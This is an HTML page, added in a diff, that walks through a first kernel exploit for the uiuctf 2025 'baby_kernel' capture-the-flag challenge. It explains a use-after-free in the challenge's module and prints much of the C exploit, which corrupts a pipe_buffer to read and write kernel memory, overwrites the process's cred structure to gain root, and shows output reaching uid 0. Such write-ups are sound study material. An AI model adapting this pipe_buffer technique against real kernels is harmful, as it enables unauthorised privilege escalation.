@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Page Title</title>
+</head>
+<body>
+
+        <h1>baby_kernel write up (<a href="./index.html">home</a>)</h1>
+
+<h1>Prologue</h1>
+<p>
+<code>baby_kernel</code> is a CTF challenge that was distributed in uiuctf 2025. The challenge author is UIUCTF Inc. This is my first kernel pwn, so let me know how you think I went, and what I could improve upon :)
+</p>
+
+<blockquote> Do or do not, there is no try -- Yoda </blockquote>
+
+<h1>Introduction</h1>
+We're given the following files
+<ul>
+	<li>handout/</li>
+	<li>handout/bzImage</li>
+	<li>handout/initrd.cpio.gz</li>
+	<li>handout/run.sh</li>
+	<li>handout/vuln.c</li>
+	<li>handout/vuln.ko</li>
+</ul>
+
+<p>
+<code>bzImage</code> is the compressed linux kernel image, and <code>initrd.cpio.gz</code> is the initramfs. Within the initramfs, there are two files of importance; <code>init</code> contains the init script, and <code>flag.txt</code> contains the flag. When <code>init</code> runs, it loads <code>vuln.ko</code> and gives <code>flag.txt</code> 0400 permissions, with the owner and group both being root. The challenge then becomes to somehow exploit the <code>vuln.ko</code> module to gain a privesc.
+</p>
+
+<h1><code>vuln.ko</code></h1>
+The challenge provides the source code for <code>vuln.ko</code> in <code>vuln.c</code>. The relevant parts are,
+<pre>
+<code>
+#define ALLOC _IOW(K1_TYPE, 0, size_t)
+#define FREE _IO(K1_TYPE, 1)
+#define USE_READ _IOR(K1_TYPE, 2, char)
+#define USE_WRITE _IOW(K1_TYPE, 2, char)
+
+void* buf = NULL;
+size_t size = 0;
+
+long handle_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
+    switch (cmd) {
+        case ALLOC: {
+            if (buf) {
+                return -EFAULT;
+            }
+            ssize_t n =  copy_from_user(&size, (void*)arg, sizeof(size_t));
+            if (n != 0) {
+                return n;
+            }
+            buf = kzalloc(size, GFP_KERNEL);
+            return 0;
+        };
+        case FREE: {
+            if (!buf) {
+                return -EFAULT;
+            }
+            kfree(buf);
+            break;
+        }
+        case USE_READ: {
+            if (!buf) {
+                return -EFAULT;
+            }
+            return copy_to_user((char*)arg, buf, size);
+        }
+
+        case USE_WRITE: {
+            if (!buf) {
+                return -EFAULT;
+            }
+            return copy_from_user(buf, (char*)arg, size);
+        }
+
+        default: {
+            break;
+        }
+
+    }
+    return 0;
+}
+</code>
+</pre>
+
+<p>
+If the <code>ALLOC</code> case is taken, <code>buf</code> is allocated a user-defined amount of memory. If the <code>FREE</code> case is taken, the previously allocated memory is freed. However, the module does not set <code>buf</code> to NULL. Therefore, subsequence <code>USE_READ</code> and <code>USE_WRITE</code> cases will write to freed memory. This is a classic use-after-free bug.
+</p>
+
+<h1> Exploit </h1>
+<p>
+Now that the vulnerability has been identified, we need to pick a target object to corrupt. I decided to use the <code> struct pipe_buffer </code> object to implement the technique in this Interrupt Labs article (<a href="https://www.interruptlabs.co.uk/articles/pipe-buffer">source</a>). From now on, it is assumed you fully understand the contents of this article.
+</p>
+
+<h2> Corrupting the <code>struct pipe_buffer</code></h2>
+When the <code>pipe</code> system call is called, the kernel creates a <code> struct pipe_inode_info</code> object for this particular pipe,
+<pre>
+<code>
+struct pipe_inode_info {
+	...
+	unsigned int head;
+	unsigned int tail;
+	...
+	struct pipe_buffer *bufs;
+	...
+};
+</code>
+</pre>
+
+The <code>bufs</code> field is a pointer to the first element of an array of <code>struct pipe_buffer</code> objects,
+<pre>
+<code>
+/**
+ *      struct pipe_buffer - a linux kernel pipe buffer
+ *      @page: the page containing the data for the pipe buffer
+ *      @offset: offset of data inside the @page
+ *      @len: length of data inside the @page
+ *      @ops: operations associated with this buffer. See @pipe_buf_operations.
+ *      @flags: pipe buffer flags. See above.
+ *      @private: private data owned by the ops.
+ **/
+struct pipe_buffer {
+        struct page *page;
+        unsigned int offset, len;
+        const struct pipe_buf_operations *ops;
+        unsigned int flags;
+        unsigned long private;
+};
+</code>
+</pre>
+
+<p>
+The array of buffers is treated as a ring buffer, with the head and tail being found in the <code>struct pipe_inode_info</code> object.
+</p>
+
+<p>
+Each <code>struct pipe_buffer</code> has a pointer to a <code>struct page</code> object, which contains the meta-data for a particular page that the page allocator has returned. 
+</p>
+
+<p>
+When a pipe is created, two file descriptors are returned. The read-end of the pipe reads the data stored in the <code>struct page</code> pointers in the <code>struct pipe_buffer</code> ring buffer. The write-end of the pipe writes to the same pages. In summary, a pipe maintains a list of pages from which userspace can read and write to.
+</p>
+
+<p>
+If userspace can corrupt the <code>*page</code> pointer cleverly, then subsequence writes and reads to the pipe will be able to act upon arbritrary pages, giving us WRITE-WHAT-WHERE and READ-WHAT-WHERE primitives. In this exploit, I've decided to write to the <code>struct cred</code> object as alluded to in the article. I overwrite the *id fields to be 0, escalating the privileges of the process to root.
+</p>
+
+<aside>It was at this moment when I was writing this post that I suddently realised how fragile my exploit is. The initialisation of a </code>.git</code> directory, and printing the process name generated by </code>mktemp</code> causes kernel panics. Due to the delicate nature of the exploit, I can only show the POC code which is of sub-par quality. Perhaps one day I'll use my own compiled kernel with debugging symbols and figure out what's happening. For now, there's a high chance the exploit won't work on your computer. Not to worry, I have video evidence of my solution ;) </aside>
+
+
+<h2>Code</h2>
+<h3>Formalities</h3>
+Our first order of business is to get the formalities out of the way.
+<pre>
+<code>
+#define DEV_PATH "/dev/vuln"
+#define DEF_RING_SIZE 16
+#define VMEMMAP_MASK 0xfffffffff0000000
+#define PIPE_BUF_FLAG_CAN_MERGE 0x10
+#define COMM_OFFSET 1872
+#define PAGE_SIZE 0x1000
+#define CRED_OFFSET 1856
+
+int main(void) {
+        int fd = -1;
+        int ret = -1;
+        int status = EXIT_FAILURE;
+        struct pipe_buffer buf[DEF_RING_SIZE] = {0};
+        size_t buf_size = sizeof(buf);
+        intptr_t cred_struct_ptr = 0;
+        intptr_t leaked_ptr = 0;
+        intptr_t task_struct_ptr = 0;
+        intptr_t cred_struct_page_ptr = 0;
+        intptr_t vmemmap_base = 0;
+        void *memmem_ret = NULL;
+        char *process_name = NULL;
+        struct pipe_buffer pbuf = {0};
+        
+        passwd_fd = open("/etc/passwd", O_RDONLY);
+        if (passwd_fd == -1) {
+                perror("open");
+                return EXIT_FAILURE;
+        }
+        
+        passwd_map = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, passwd_fd, 0); // [1] map a file so it can be spliced into a pipe
+        if (passwd_map == MAP_FAILED) {
+                perror("mmap");
+                goto close_file;
+        }
+        
+        process_name = mktemp((char[]){'X', 'X', 'X', 'X', 'X', 'X', '\0'}); // [2] randomly generate a process name
+        if (errno) {
+                perror("mktemp");
+                goto close_file;
+        }
+        
+        if (pin_cpu(0) == -1) { // [3] slab caches are per-cpu, so pin the process on cpu 0
+                goto close_file;
+        }
+        
+        if (log_status("pin_cpu") < 0)
+                goto close_file;
+        
+        fd = open(DEV_PATH, O_RDWR); // [4] open the vulnerable kernel driver
+        if (fd == -1) {
+                perror("open");
+                goto close_file;
+        }
+        
+        if (log_status("dev opened") < 0)
+                goto close_file;
+        
+</code>
+</pre>
+
+The code does the following:
+<ol>
+        <li>Maps a file so that it can spliced into a pipe. This is needed to advanced the head of the <code>struct pipe_inode_info</code> object to subsequent reads do not hang</li>
+        <li>Generate a random process name so we can scan the kernel heap for the <code>struct task_struct</code> object. The <code>mktemp</code> function should <em>never</em> be used. I use it anyway, and this may contribute to the fragility of the exploit</li>
+        <li>Pin the process to a cpu so that the use-after-free acts upon the same slab caches</li>
+</ol>
+
+<h3>Use-after-free</h3>
+Now we leak the <code>struct pipe_buffer</code> object through the use-after-free bug,
+<pre>
+<code>
+        ret = ioctl(fd, ALLOC, &buf_size); // [1] Use
+        if (ret) {
+                perror("ALLOC");
+                goto close_dev;
+        }
+
+        if (log_status("buf alloc'd") < 0)
+                return EXIT_FAILURE;
+
+        ret = ioctl(fd, FREE, NULL); // [2] Free
+        if (ret) {
+                perror("FREE");
+                goto close_dev;
+        }
+
+        if (log_status("buf free'd") < 0)
+                return EXIT_FAILURE;
+
+        if (spray_pipes() < 0) // [3] Create a pipe
+                goto close_dev;
+
+        if (log_status("pipes sprayed") < 0)
+                return EXIT_FAILURE;
+
+        if (splice_passwd() < 0) [4] Splice the password mapping into the pipe
+                goto close_dev;
+
+        if (log_status("passwd spliced") < 0)
+                goto close_dev;
+
+        ret = ioctl(fd, USE_READ, buf); [5] Read the freed buffer contents
+        if (ret) {
+                perror("USE_READ");
+                goto close_dev;
+        }
+
+        if (log_status("buf read") < 0)
+                goto close_dev;
+
+        leaked_ptr = (intptr_t)buf[0].page;
+        vmemmap_base = leaked_ptr & VMEMMAP_MASK;
+        printf("leaked_ptr 0x%lx\n", leaked_ptr);
+</code>
+</pre>
+
+The code does the following:
+<ol>
+        <li>16 <code>struct pipe_buffer</code>s are allocated for each pipe, so we make the driver allocate the same amount as this</li>
+        <li>Free out allocation which should release a slab object back to the slob allocator</li>
+        <li>Create a pipe which should use the recently released object for the <code>struct pipe_buffer</code> objects </li>
+        <li> Splice some contents into the pipe, so the pipe isn't empty and the read operation doesn't hang</li>
+        <li>Read the contents of the allocated memory</li>
+</ol>
+
+We now have a leaked <code>struct page*</code> pointer, from which the <code>vmemmap_base</code> can be derived using a mask.
+
+<h3>Scanning kernel heap</h3>
+Now we corrupt this <code>struct page*</code> pointer and use it to scan the kernel heap,
+<pre>
+<code>
+        if (prctl(PR_SET_NAME, process_name, 0, 0, 0) < 0) { // [1] change the process name
+                perror("prctl");
+                goto close_dev;
+        }
+
+        while (leaked_ptr > vmemmap_base) {
+                cred_struct_ptr = 0;
+
+                splice_passwd();
+
+                char read_buf[PAGE_SIZE] = {0};
+                pbuf = (struct pipe_buffer){ // [2] create a corrupted pipe_buffer
+                    .page = (void *)(leaked_ptr -= 0x40),
+                    .offset = buf[0].offset,
+                    .len = buf[0].len,
+                    .ops = buf[0].ops,
+                    .flags = buf[0].flags | PIPE_BUF_FLAG_CAN_MERGE,
+                    .private = buf[0].private,
+                };
+
+                for (unsigned i = 0; i < sizeof(buf) / sizeof(*buf); i++)
+                        buf[i] = pbuf;
+
+                ret = ioctl(fd, USE_WRITE, buf); // [3] corrupt the current pipe_buffer
+                if (ret) {
+                        perror("ioctl:" str(__LINE__));
+                        return EXIT_FAILURE;
+                }
+
+                if (log_status("USE_WRITE") < 0)
+                        return EXIT_FAILURE;
+
+                if (log_status("USE_WRITE called") < 0)
+                        return EXIT_FAILURE;
+
+                for (unsigned int j = 0; j < REAL_SPRAY_CNT; j++) { // [4] read the page the corrupted pipe_buffer points to
+                        if (log_status("reading from pipe") < 0)
+                                return EXIT_FAILURE;
+                        if (read(spray_pipefds[j].read, read_buf,
+                                 sizeof(read_buf)) < 0) {
+                                perror("read");
+                                return EXIT_FAILURE;
+                        }
+                }
+
+                if (log_status("read from pipes") < 0)
+                        return EXIT_FAILURE;
+
+                memmem_ret = memmem(read_buf, sizeof(read_buf), process_name,
+
+                                    strlen(process_name)); // [5] search for the process name
+                if (log_status("searched for process") < 0)
+                        return EXIT_FAILURE;
+                if (memmem_ret) { // if we found the process name, assume it belong to the task struct
+                        task_struct_ptr =
+                            (intptr_t)pbuf.page +
+                            ((intptr_t)memmem_ret - (intptr_t)read_buf) -
+                            COMM_OFFSET;
+                        unsigned cred_struct_index =
+                            (intptr_t)memmem_ret - (intptr_t)read_buf - 16;
+                        if (log_status("found process struct") < 0)
+                                return EXIT_FAILURE;
+
+                        for (unsigned j = 0; j < sizeof(intptr_t); j++) {
+                                cred_struct_ptr |= // [6] the task struct contains the pointer to the page struct
+                                    ((read_buf[cred_struct_index + j]) &
+                                     ((intptr_t)0xFF))
+                                    << (CHAR_BIT * j);
+                        }
+                        if (cred_struct_ptr)
+                                break;
+                }
+        }
+        cred_struct_page_ptr =
+            vmemmap_base + (((cred_struct_ptr & 0xffffffff) >> 12) * 0x40); // [7] calculate the page pointer for the cred struct
+
+        printf("task_struct_ptr 0x%lx\n", task_struct_ptr);
+        printf("cred_struct_ptr 0x%lx\n", cred_struct_ptr);
+        printf("vmemmap_base 0x%lx\n", vmemmap_base);
+        printf("cred_struct_page_ptr 0x%lx\n", cred_struct_page_ptr);
+</code>
+</pre>
+
+The code does the following,
+<ol>
+        <li>Changes the process name to something random and unique</li>
+        <li>Creates a corrupted <code>struct pipe_buffer</code> object. The creation of this object decrements the leaked pointer by <code>sizeof (struct page)</code> which is 0x40</li>
+        <li>Writes the userspace <code>struct pipe_buffer</code> object to kernelspace</li>
+        <li>Reads the page where the corrupted buffer now points to. Note that each iteration of the loop splices contents into the pipe so this read does not hang</li>
+        <li>If the process name was found in the page, we just assume the page contains the <code>task_struct</code> object</li>
+        <li>Use arithmetic to determine the <code>struct cred*</code> field found inside of the <code>struct task_struct</code></li>
+        <li>Get the <code>struct page*</code> that refers to the leaked <code>struct cred</code> object</li>
+</ol>
+
+<h3>Privesc</h3>
+Now that we've found where the current process's credentials live, we use the WRITE-WHAT-WHERE primitive to overwrite them with 0s,
+<pre>
+<code>
+        char read_buf[PAGE_SIZE] = {0};
+        char write_buf[32] = {0};
+
+        pbuf = (struct pipe_buffer){ // [1] Create a corrupted buffer that will allow use to overwrite the credentials
+            .page = (void *)cred_struct_page_ptr,
+            .offset = (cred_struct_ptr & (intptr_t)0xfff) + sizeof(int) + 2,
+            .len = 0,
+            .ops = buf[0].ops,
+            .flags = buf[0].flags | PIPE_BUF_FLAG_CAN_MERGE,
+            .private = 0,
+        };
+
+        print_pipe_buffer(pbuf);
+
+        for (unsigned i = 0; i < sizeof(buf) / sizeof(*buf); i++)
+                buf[i] = pbuf;
+
+        ret = ioctl(fd, USE_WRITE, buf); // [2] Corrupt the current pipe
+        if (ret) {
+                perror("ioctl:" str(__LINE__));
+                return EXIT_FAILURE;
+        }
+
+        if (log_status("USE_WRITE") < 0)
+                return EXIT_FAILURE;
+
+        if (log_status("USE_WRITE called") < 0)
+                return EXIT_FAILURE;
+
+        getchar();
+
+        size_t read_size = 32;
+        puts("overwriting cred struct");
+        if ((ret = write(spray_pipefds[0].write, write_buf, // [3] Write to the cred struct
+                  sizeof(write_buf))) < 0) {
+                perror("write pipe");
+                return EXIT_FAILURE;
+        }
+        printf("uid %d\n", getuid()); // We should be uid=0 which is root now :D
+        printf("finished overwriting cred struct: ret = %d\n", ret);
+
+        puts("");
+
+        fd = -1;
+        char flag[18] = { 0 };
+        fd = open("./flag.txt", O_RDONLY);
+        if (ret == -1) {
+                perror("write pipe");
+                return EXIT_FAILURE;
+        }
+
+        ret = read(fd, flag, sizeof flag); // [4] Open and read the flag
+        if (ret == -1) {
+                perror("write pipe");
+                return EXIT_FAILURE;
+        }
+
+        puts(flag);
+</code>
+</pre>
+
+The code does the following,
+<ol>
+        <li>Creates a corrupted <code>struct pipe_buffer</code> which has the correct length and offset so as to directly overwrite the process credentials</li>
+        <li>Corrupt the pipe. We are writing this time, so a splice isn't needed</li>
+        <li>Write 0s to the *id fields of <code>struct cred</code></li>
+        <li>Read the flag and win :D</li>
+</ol>
+
+Here's the exploit output of a successful run,
+<pre>
+<code>
+uid=1000 gid=1000 groups=1000
+leaked_ptr 0xffd40000001d9f40
+task_struct_ptr 0xffd400000010f5c8
+cred_struct_ptr 0xff110000043bbc00
+vmemmap_base 0xffd4000000000000
+cred_struct_page_ptr 0xffd400000010eec0
+
+========
+pbuf->page: 0xffd400000010eec0
+pbuf->offset: 3078
+pbuf->len: 0
+pbuf->ops: 0xffffffff82220340
+pbuf->flags: 16
+pbuf->private: 0
+========
+
+overwriting cred struct
+uid 0
+finished overwriting cred struct: ret = 32
+
+uiuctf{test_flag}
+</code>
+</pre>
+
+<h1>Epilogue</h1>
+So that's my first kernel pwn :o. Please let me know how I did :) Some things to note- the exploit in it's current state is reliable on my machine, however any slight modification may lower its reliability. Disabling kaslr further increases exploit relability. The direction the kernel heap was scanned was arbritrarily chosen (decrementing the leaked pointer). The code is obviously of amateur quality. Once I debug the exploit on my own kernel I can increase reliability and therefore improve the exploit.
+</body>
+</html>
+
